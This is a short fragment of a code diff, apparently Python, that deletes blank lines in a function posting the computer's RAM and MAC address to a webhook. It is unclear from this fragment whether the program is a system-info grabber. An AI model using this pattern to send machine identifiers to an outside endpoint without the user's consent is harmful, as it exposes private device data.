@@ -144,11 +144,6 @@ async def main():
 **Computer RAM:** {computer_info['ram']}
 **Mac Address:** {computer_info['mac_address']}
     """, inline=False)
-    
-    
-    
-    
-    
     webhook.add_embed(embed)
     response = webhook.execute()
 
